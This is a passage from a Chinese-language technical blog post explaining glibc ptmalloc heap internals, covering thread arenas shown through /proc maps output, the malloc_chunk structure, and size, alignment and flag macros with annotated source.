class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 thread arena。</p><p>注意：</p><blockquote><p>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">After malloc and before free <span class="keyword">in</span> thread 1</span><br><span class="line">After free <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></blockquote><h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><p>堆的操作就这么复杂，那么在 glibc 内部必然也有精心设计的数据结构来管理它。与堆相应的数据结构主要分为</p><ul><li>宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。</li><li>微观结构，用于具体处理堆的分配与回收中的内存块。</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><p>这里首先介绍堆的一些主要内部结构，<strong>堆的漏洞利用与这些结构密切相关</strong>。</p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在程序的执行过程中，我们称由malloc申请的内存为<code>chunk</code>。这块内存在ptmalloc内部用malloc_chunk结构体来表示。当程序申请的<code>chunk</code>被free后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个<code>chunk</code>的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。</strong>虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><p>malloc_chunk 的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk的大小（仅当前一个chunk空闲时有效） */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* 当前chunk的总大小（包含头部和数据区） */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* 双向链表指针：指向下一个空闲chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>         <span class="comment">/* 双向链表指针：指向前一个空闲chunk */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 仅用于大内存块：维护更大尺寸的chunk链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一些必要的宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span></span><br><span class="line"><span class="comment">   chunk sizes.</span></span><br><span class="line"><span class="comment">   The default version is the same as size_t.</span></span><br><span class="line"><span class="comment">   While not strictly necessary, it is best to define this as an</span></span><br><span class="line"><span class="comment">   unsigned type, even if size_t is a signed type. This may avoid some</span></span><br><span class="line"><span class="comment">   artificial size limitations on some systems.</span></span><br><span class="line"><span class="comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span></span><br><span class="line"><span class="comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span></span><br><span class="line"><span class="comment">   expense of not being able to handle more than 2^32 of malloced</span></span><br><span class="line"><span class="comment">   space. If this limitation is acceptable, you are encouraged to set</span></span><br><span class="line"><span class="comment">   this unless you are on a platform requiring 16byte alignments. In</span></span><br><span class="line"><span class="comment">   this case the alignment requirements turn out to negate any</span></span><br><span class="line"><span class="comment">   potential advantages of decreasing size_t word size.</span></span><br><span class="line"><span class="comment">   Implementors: Beware of the possible combinations of:</span></span><br><span class="line"><span class="comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span></span><br><span class="line"><span class="comment">       and might be the same width as int or as long</span></span><br><span class="line"><span class="comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment">     - int and long might be 32 or 64 bits, and might be the same width</span></span><br><span class="line"><span class="comment">   To deal with this, most comparisons and difference computations</span></span><br><span class="line"><span class="comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span></span><br><span class="line"><span class="comment">   aware of the fact that casting an unsigned int to a wider long does</span></span><br><span class="line"><span class="comment">   not sign-extend. (This also makes checking for negative numbers</span></span><br><span class="line"><span class="comment">   awkward.) Some of these casts result in harmless compiler warnings</span></span><br><span class="line"><span class="comment">   on some systems.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc&#x27;ed chunks.  It</span></span><br><span class="line"><span class="comment">   must be a power of two at least 2 * SIZE_SZ, even on machines for</span></span><br><span class="line"><span class="comment">   which smaller alignments would suffice. It may be defined as larger</span></span><br><span class="line"><span class="comment">   than this though. Note however that code and data structures are</span></span><br><span class="line"><span class="comment">   optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="meta">              ? __alignof__ (long double) : 2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><blockquote><p>一般来说， <code>size_t</code> 被定义为 <code>unsigned long</code> ，其在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p></blockquote><p>接下来逐个解释chunk结构体的各个字段</p><p><strong>结构体设计的 “误导性”</strong></p><p>注释提到该结构体是一种 “视图（view）”，原因在于：</p><ul><li><p><strong>双重角色</strong>：同一个结构体既要表示<strong>已分配的内存块</strong>，也要表示<strong>空闲的内存块</strong>。</p></li><li><p>字段复用</p><p>：</p><ul><li>当 chunk 被分配时，<code>fd</code> 和 <code>bk</code> 指针不使用（被应用程序数据覆盖）。</li><li>仅当 chunk 空闲时，<code>fd</code> 和 <code>bk</code> 才构成双向链表，用于快速查找可用内存。</li></ul></li><li><p><strong><code>prev_size</code></strong></p><ul><li>若物理相邻的前一个 chunk 是空闲的，则存储其大小（包括chunk头）。</li><li>若物理相邻的前一个 chunk 已分配，则该字段被前一个 chunk 的数据覆盖（节省空间）。</li></ul></li><li><p>**<code>size</code>**该chunk的大小，大小必须是<code>MALLOC_ALIGNMENT</code>的整数倍。如果申请的内存大小不是<code>MALLOC_ALIGNMENT</code>的整数倍，会被转换为满足大小的最小的<code>MALLOC_ALIGNMENT</code>的倍数，这通过<code>request2size()</code>宏完成。32位系统中，<code>MALLOC_ALIGNMENT</code>可能是 4 或 8 ；64位系统中，<code>MALLOC_ALIGNMENT</code>是 8 。该字段的低三个比特位对<code>chunk</code>的大小没有影响为标志位，他们从高到低分别表示：</p><ul><li>NON_MAIN_ARENA，记录当前<code>chunk</code>是否不属于主线程，1表示不属于，0表示属于。</li><li>IS_MAPPED，记录当前<code>chunk</code>是否是由mmap分配的。</li><li>PREV_INUSE，记录前一个<code>chunk</code>块是否被分配。一般来说，堆中第一个被分配的内存块的size字段的p位都会设置为1，以便于防止访问前面的非法内存。当一个<code>chunk</code>的size的p位为0时，我们能通过<code>prev_size</code>字段来获取上一个<code>chunk</code>的大小以及地址。这也方便进行空闲<code>chunk</code>之间的合并</li></ul></li><li><p><strong><code>fd,bk</code></strong> <code>chunk</code>处于分配状态时，从fd字段开始是用户的数据。<code>chunk</code>空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p><pre><code>- fd 指向下一个（非物理相邻）空闲的`chunk`- bk 指向上一个（非物理相邻）空闲的`chunk`- 通过 fd 和 bk 可以将空闲的`chunk`块加入到空闲的`chunk`块链表进行统一管理</code></pre></li><li><p><strong><code>fd_nextsize，bk_nextsize</code></strong> 只有chunk空闲时才使用，不过其用于较大的<code>chunk</code>（<code>large chunk</code>大内存块）</p><pre><code>- fd_nextsize 指向前一个与当前 `chunk` **大小不同**的第一个空闲块，不包含 bin 的头指针- bk_nextsize 指向后一个与当前`chunk`**大小不同**的第一个空闲块，不包含 bin 的头指针- 一般空闲的`large chunk`在fd的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk时挨个遍历 ，加速寻找过程</code></pre></li></ul><blockquote><p>自 glibc 2.26 版本起，在 32 位 glibc 中，<code>MALLOC_ALIGNMENT</code> 宏的定义在编译时优先选择 <code>sysdeps/i386/malloc-alignment.h</code> 当中的定义，该值定义为一个常量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT 16</span></span><br></pre></td></tr></table></figure><p>因此，对于自 2.26 版本起始的 32 位 glibc，其 <code>MALLOC_ALIGNMENT</code> 并非基于 <code>SIZE_SZ</code> 计算的 <code>8</code> ，而是和 64 位 glibc 所用值相同的 <code>16</code>。</p></blockquote><p>一个已经分配的<code>chunk</code>的样子如下，我们称前两个字段为<code>chunk header</code>，后面的部分称为<code>user data</code>。每次malloc申请得到的内存指针，其实指向<code>user data</code>的起始处。</p><p>当一个 <code>chunk</code> 处于使用状态时，它的下一个 <code>chunk</code> 的 prev_size 域无效，所以下一个 <code>chunk</code> 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_15-32-02.png" alt="1"></p><p>被释放的 <code>chunk</code> 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_15-34-07.png" alt="1"></p><p>可以发现，如果一个 <code>chunk</code> 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 <code>chunk</code> 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 <code>chunk</code> 会被合并为一个 <code>chunk</code> 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 <code>chunk</code> 块。</p><h4 id="chunk-相关宏"><a href="#chunk-相关宏" class="headerlink" title="chunk 相关宏"></a>chunk 相关宏</h4><blockquote><p>介绍一些宏定义里用到的内存计算指令</p><p>按位取反（~）</p><p>~7 &#x3D; 0xFFFFFFF8</p><p>47 &amp; ~7 &#x3D; 47 &amp; 0xFFFFFFF8 &#x3D; 40（将数值 <strong>47</strong> 向下舍入到 <strong>8 字节对齐</strong> 的边界，即找到 <strong>≤47</strong> 且为 <strong>8 的倍数</strong> 的最大数值）</p><p>&amp;<strong>按位与（Bitwise AND）运算</strong>，用于将数值 <strong>47</strong> 对齐到 <strong>8 字节边界</strong></p></blockquote><p>这里主要介绍<code>chunk</code>的大小、对齐检查以及一些转换的宏 </p><p><strong>chunk 与 mem 指针头部的转换</strong></p><p>mem 指向用户得到的内存的起始位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*从 malloc 头部（chunk）到用户指针（mem）的转换，以及反向转换。*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure><ul><li><code>chunk2mem(p)</code>：将 <code>chunk</code> 指针（指向 <code>malloc_chunk</code> 结构体）转换为用户实际可用的内存指针（跳过 <code>prev_size</code> 和 <code>size</code> 字段，指向用户数据区起始位置）。</li><li><code>mem2chunk(mem)</code>：将用户内存指针反向转换为 <code>chunk</code> 指针（回溯两个 <code>SIZE_SZ</code> 大小的偏移，指向 <code>malloc_chunk</code> 结构体起始位置）。</li><li><strong>关键</strong>：<code>SIZE_SZ</code> 为 <code>INTERNAL_SIZE_T</code> 的字节数（32 位系统为 4，64 位为 8），因此偏移量为 <code>2 * SIZE_SZ</code>（即 <code>prev_size</code> 和 <code>size</code> 字段总长度）。</li></ul><p><strong>最小的<code>chunk</code>大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 最小可能的 chunk 大小。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><ul><li>使用 <code>offsetof</code> 计算 <code>malloc_chunk</code> 结构体中 <code>fd_nextsize</code> 字段的偏移量，即 <code>chunk</code> 至少需包含 <code>prev_size</code>、<code>size</code>、<code>fd</code>、<code>bk</code> 字段（<code>fd_nextsize</code> 为 large bin 专用，最小块不包含）。</li><li><strong>实际含义</strong>：最小 <code>chunk</code> 大小为 <code>2 * SIZE_SZ（prev_size + size） + 2 * sizeof(void*)（fd + bk）</code>，确保双向链表基本结构。</li></ul><p><strong>最小申请的堆内存大小</strong></p><p>用户最小申请的内存大小必须是 2*SIZE_SE 的最下整数倍</p><p>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* malloc 能申请的最小大小为对齐后的最小块 */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure><ul><li><code>MALLOC_ALIGN_MASK</code> 为对齐掩码（值为 <code>MALLOC_ALIGNMENT - 1</code>，如 64 位系统为 <code>0xf</code>）。</li><li>计算逻辑：将 <code>MIN_CHUNK_SIZE</code> 向上对齐到 <code>MALLOC_ALIGNMENT</code> 的倍数，确保内存地址对齐（如 64 位系统对齐 16 字节）。</li><li><strong>示例</strong>：若 <code>MIN_CHUNK_SIZE</code> 为 <code>0x20</code>（32 字节），<code>MALLOC_ALIGNMENT</code> 为 16，则 <code>MINSIZE</code> 为 <code>0x20</code>（已对齐）。</li></ul><p><strong>检查分配给用户的内存是否对齐</strong></p><p>2 * SIZE_SZ 大小对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 检查 m 是否符合对齐要求 */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line"><span class="meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span></span><br><span class="line"><span class="meta">     MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p><strong>请求字节数判断</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  检查请求是否过大，导致在填充和对齐后其值会绕零回环（即溢出）。为简化其他代码逻辑，边界值被设得足够低，确保加上最小尺寸（MINSIZE）后也不会发生绕零回环。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure><p><strong>将用户请求内存大小转为实际分配内存大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将用户请求的字节数转换为可用的块大小（内部版本） */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  相同，但同时执行参数检查 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><ul><li><strong>步骤 1</strong>：判断请求大小 <code>req</code> 加上 <code>SIZE_SZ</code>（预留 <code>size</code> 字段空间）和对齐掩码后的总大小是否小于 <code>MINSIZE</code>。</li><li><strong>步骤 2</strong>：若小于，直接返回 <code>MINSIZE</code>（强制分配最小块）；否则，通过掩码对齐到 <code>MALLOC_ALIGNMENT</code> 的倍数。</li><li><strong>核心逻辑</strong>：确保用户数据区大小为 <code>req</code>，但整个 <code>chunk</code> 需包含头部（<code>prev_size</code> 和 <code>size</code>）并满足对齐要求。</li></ul><p>当一个 <code>chunk</code> 处于已分配状态时，它的物理相邻的下一个 <code>chunk</code> 的 prev_size 字段必然是无效的，故而这个字段就可以被当前这个 <code>chunk</code> 使用。这就是 ptmalloc 中 <code>chunk</code> 间的复用。具体流程如下</p><ol><li>首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。</li><li>其次，需要注意的是用户请求的字节是用来存储数据的，即 <code>chunk header</code> 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 <code>chunk</code> 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。</li><li>由于系统中所允许的申请的 <code>chunk</code> 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配 MINSIZE 字节。</li><li>如果大于的话，因为系统中申请的 <code>chunk</code> 需要 2 * SIZE_SZ 对齐，所以这里需要加上 MALLOC_ALIGN_MASK 以便于对齐。</li></ol><p><strong>标记位相关</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当相邻的前一个内存块（chunk）被使用时，size字段会与PREV_INUSE进行按位或操作 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提取前一个内存块的使用状态位 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果内存块是通过mmap()分配的，size字段会与IS_MMAPPED进行按位或操作 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查内存块是否通过mmap()分配 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果内存块来自非主分配区（non-main arena），size字段会与NON_MAIN_ARENA进行按位或操作。</span></span><br><span class="line"><span class="comment">   该标志仅在必要时，在将内存块交给用户前设置。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查内存块是否来自主分配区 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将内存块标记为非主分配区 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   提取内存块大小时需要屏蔽的位</span></span><br><span class="line"><span class="comment">   注意：在设计上，对于不应该出现mmap内存块的宏，IS_MMAPPED标志不会从size字段中屏蔽。</span></span><br><span class="line"><span class="comment">   这可以在有人意外扩展或修改此malloc实现时，通过核心转储（core dump）提供有效提示。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><p>**获取 chunk size **</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 